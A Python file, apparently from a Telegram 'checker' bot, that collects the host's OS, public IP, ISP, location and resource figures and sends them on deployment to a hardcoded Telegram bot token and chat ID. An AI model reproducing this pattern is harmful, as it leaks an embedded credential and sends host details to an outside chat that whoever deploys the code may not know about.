def get_server_isp_and_location(ip_address):
    try:
        import httpx
        response     = httpx.get(f"https://ipapi.co/{ip_address}/json/")
        response     = response.json()
        city         = response["city"]
        country_name = response["country_name"]
        org          = response["org"]
        return org , city + " - " + country_name 
    except:
        city, country_name, org = "Not Found", "Not Found", "Not Found"
        return org , city + " - " + country_name


def get_server_os():
    import platform
    server_os = platform.system()
    return server_os


def get_server_ram(server_os):
    import os
    if server_os == "Windows":
        server_ram = os.popen('powershell "Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory"').read()
        server_ram = f"{int(server_ram) / (1024 ** 3):.2f} GB"
    else:
        server_ram = os.popen("free -h | grep -i Mem | awk '{print $2}'").read().strip()
    return server_ram


def get_server_core(server_os):
    import os , multiprocessing
    if server_os == "Windows":
        server_core = multiprocessing.cpu_count()
    else:
        server_core = os.popen("nproc").read().strip()
    return server_core


def get_server_storage(server_os):  
    import os
    if server_os == "Windows":
        try:
            server_storage = os.popen("powershell \"(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq 'C:'}).Size\"").read()
            server_storage = f"{int(server_storage) / (1024 ** 3):.2f} GB"
        except ValueError:
            server_storage = "N/A"
    else:
        try:
            server_storage = os.popen("df -h | grep -i /$ | awk '{print $2}'").read().strip()
        except ValueError:
            server_storage = "N/A"
    return server_storage


def get_server_ip():
    import os
    server_ip = os.popen("curl https://api.ipify.org/").read().strip()
    return server_ip


def get_server_cpu_usage():
    import psutil
    cpu_usage = f"{psutil.cpu_percent()}%"
    return cpu_usage

def get_server_ram_usage():
    import psutil
    ram_usage = f"{psutil.virtual_memory().percent}%"
    return ram_usage

def send_server_alert():
    import os 
    import urllib.parse
    import httpx
    server_os                   = get_server_os()
    server_ram                  = get_server_ram(server_os)
    server_core                 = get_server_core(server_os)
    server_storage              = get_server_storage(server_os)
    server_ip                   = get_server_ip()
    server_cpu_usage            = get_server_cpu_usage()
    server_ram_usage            = get_server_ram_usage()
    server_isp, server_location = get_server_isp_and_location(server_ip)
    process_id = os.getpid()

    stats = f"""<b>
MASTER Checker ⚡️ ( @MASTER_checker_bot ) 

Bot Deployed Successfully ✅

Server OS : {server_os}
Server IP : {server_ip}
Server ISP : {server_isp}
Server Location : {server_location}
Server Ram : {server_ram}
Server Storage : {server_storage}
Server Core : {server_core}
Server CPU Usage : {server_cpu_usage}
Server Ram Usage : {server_ram_usage}

Process ID: <code>{process_id}</code>
    </b>"""
    stats = urllib.parse.quote_plus(stats)

    httpx.get(f"https://api.telegram.org/bot6571774499:AAH4AM40scx3I-FI9yuoeievS1YBdqliVHk/sendMessage?chat_id=6745804180&text={stats}&parse_mode=HTML&disable_web_page_preview=True")